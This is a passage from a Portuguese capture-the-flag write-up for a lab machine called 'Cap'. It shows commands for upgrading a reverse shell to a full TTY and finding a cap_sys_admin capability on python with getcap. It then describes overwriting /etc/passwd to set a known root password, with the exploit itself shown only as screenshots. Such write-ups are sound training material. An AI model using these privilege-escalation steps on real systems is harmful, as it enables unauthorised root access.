+</p><figure id="fb4a1297-54cf-40cb-a91d-deab00e3380a" class="image"><a href="UHCV35%20-%20(Classificato%CC%81ria%20-%20Web)%20Write-Up%20-%20Cap%2072316d6cd95b41968aee3743b8eb819e/Untitled%2010.png"><img style="width:918px" src="UHCV35%20-%20(Classificato%CC%81ria%20-%20Web)%20Write-Up%20-%20Cap%2072316d6cd95b41968aee3743b8eb819e/Untitled%2010.png"/></a></figure><pre id="e50de4fc-f8f5-4c55-a250-380f1e817ecf" class="code"><code>Full tty shell
+in your shell~ python3 -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;
+CTRL + Z
+in your terminal~ stty raw -echo; fg
+ENTER
+in your shell~ export TERM=xterm</code></pre><p id="5117b230-b2dd-4866-9800-3892e5d2d7bc" class="">Indo até o / podemos encontrar nossa flag!</p><figure id="d5dbb79c-eb68-47b1-96eb-54edc529854b" class="image"><a href="UHCV35%20-%20(Classificato%CC%81ria%20-%20Web)%20Write-Up%20-%20Cap%2072316d6cd95b41968aee3743b8eb819e/Untitled%2011.png"><img style="width:384px" src="UHCV35%20-%20(Classificato%CC%81ria%20-%20Web)%20Write-Up%20-%20Cap%2072316d6cd95b41968aee3743b8eb819e/Untitled%2011.png"/></a></figure><p id="64fbf2d8-993f-4fce-b8c9-317309fcaf15" class="">Rodando alguns comandos de enumeração logo pude encontrar qual é a vulnerabilidade do priv esc (o linpeas teria achado), o comando que eu rodei para encontra-la é o getcap, que mostra para nós os capabilities que os binários do linux possuem.</p><figure id="c43fcab5-b457-4f52-9db0-49b9aedef3b8"><a href="https://book.hacktricks.xyz/linux-unix/privilege-escalation/linux-capabilities" class="bookmark source"><div class="bookmark-info"><div class="bookmark-text"><div class="bookmark-title">Linux Capabilities</div><div class="bookmark-description">CapEff : The capability set represents all capabilities the process is using at the moment (this is the actual set of capabilities that the kernel uses for permission checks). For file capabilities the effective set is in fact a single bit indicating whether the capabilities of the permitted set will be moved to the effective set upon running a binary.</div></div><div class="bookmark-href"><img src="https://gblobscdn.gitbook.com/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Favatar.png?alt=media" class="icon bookmark-icon"/>https://book.hacktricks.xyz/linux-unix/privilege-escalation/linux-capabilities</div></div><img src="https://app.gitbook.com/share/space/thumbnail/-L_2uGJGU7AVNRcqRvEi.png" class="bookmark-image"/></a></figure><figure id="f69acec7-c4bf-4a58-8aad-9db2008795ba" class="image"><a href="UHCV35%20-%20(Classificato%CC%81ria%20-%20Web)%20Write-Up%20-%20Cap%2072316d6cd95b41968aee3743b8eb819e/Untitled%2012.png"><img style="width:425px" src="UHCV35%20-%20(Classificato%CC%81ria%20-%20Web)%20Write-Up%20-%20Cap%2072316d6cd95b41968aee3743b8eb819e/Untitled%2012.png"/></a></figure><p id="14c47b73-0b29-439e-902b-810074735f66" class="">Podemos ver que o python está com um capability chamado sys_admin, dando uma olhada no hacktricks sobre como explorar isso, podemos ver que existe uma forma de sobrescrevermos o arquivo /etc/passwd adicionando uma senha que nós sabemos para o usuário root.</p><p id="b8d9507f-0542-4591-b944-6115215edbe8" class=""><a href="https://book.hacktricks.xyz/linux-unix/privilege-escalation/linux-capabilities#cap_sys_admin">https://book.hacktricks.xyz/linux-unix/privilege-escalation/linux-capabilities#cap_sys_admin</a></p><figure id="4d738b32-5d0e-4412-a06b-ca0d01641bdd" class="image"><a href="UHCV35%20-%20(Classificato%CC%81ria%20-%20Web)%20Write-Up%20-%20Cap%2072316d6cd95b41968aee3743b8eb819e/Untitled%2013.png"><img style="width:625px" src="UHCV35%20-%20(Classificato%CC%81ria%20-%20Web)%20Write-Up%20-%20Cap%2072316d6cd95b41968aee3743b8eb819e/Untitled%2013.png"/></a></figure><p id="ac001259-0064-4bb9-b76c-cc20a8935465" class="">Exploitation:</p><figure id="222bf7aa-aa27-4be8-add2-563b74afd818" class="image"><a href="UHCV35%20-%20(Classificato%CC%81ria%20-%20Web)%20Write-Up%20-%20Cap%2072316d6cd95b41968aee3743b8eb819e/Untitled%2014.png"><img style="width:336px" src="UHCV35%20-%20(Classificato%CC%81ria%20-%20Web)%20Write-Up%20-%20Cap%2072316d6cd95b41968aee3743b8eb819e/Untitled%2014.png"/></a></figure><figure id="d4542e25-1a53-46de-887b-f1a0af448446" class="image"><a href="UHCV35%20-%20(Classificato%CC%81ria%20-%20Web)%20Write-Up%20-%20Cap%2072316d6cd95b41968aee3743b8eb819e/Untitled%2015.png"><img style="width:528px" src="UHCV35%20-%20(Classificato%CC%81ria%20-%20Web)%20Write-Up%20-%20Cap%2072316d6cd95b41968aee3743b8eb819e/Untitled%2015.png"/></a></figure><figure id="35370379-21ee-486d-98e8-19d08a63483d" class="image"><a href="UHCV35%20-%20(Classificato%CC%81ria%20-%20Web)%20Write-Up%20-%20Cap%2072316d6cd95b41968aee3743b8eb819e/Untitled%2016.png"><img style="width:286px" src="UHCV35%20-%20(Classificato%CC%81ria%20-%20Web)%20Write-Up%20-%20Cap%2072316d6cd95b41968aee3743b8eb819e/Untitled%2016.png"/></a></figure><figure id="b3afae53-fb7d-4efc-9214-a3e8707bcdf8" class="image"><a href="UHCV35%20-%20(Classificato%CC%81ria%20-%20Web)%20Write-Up%20-%20Cap%2072316d6cd95b41968aee3743b8eb819e/Untitled%2017.png"><img style="width:576px" src="UHCV35%20-%20(Classificato%CC%81ria%20-%20Web)%20Write-Up%20-%20Cap%2072316d6cd95b41968aee3743b8eb819e/Untitled%2017.png"/></a></figure><p id="1b4ebb58-5421-4031-977a-6afd6d4bb8d8" class="">Depois de rodar o exploit damos um:</p><figure id="d2bdf63d-5a2d-43d9-889d-b30cdeef4122" class="image"><a href="UHCV35%20-%20(Classificato%CC%81ria%20-%20Web)%20Write-Up%20-%20Cap%2072316d6cd95b41968aee3743b8eb819e/Untitled%2018.png"><img style="width:381px" src="UHCV35%20-%20(Classificato%CC%81ria%20-%20Web)%20Write-Up%20-%20Cap%2072316d6cd95b41968aee3743b8eb819e/Untitled%2018.png"/></a></figure><p id="996f51ef-ec0d-4abe-9f4d-2aa427e38fb4" class="">E ai está nossa flag, parabéns kadu pela máquina e obrigado a você que leu até aqui!</p></div></article></body></html>
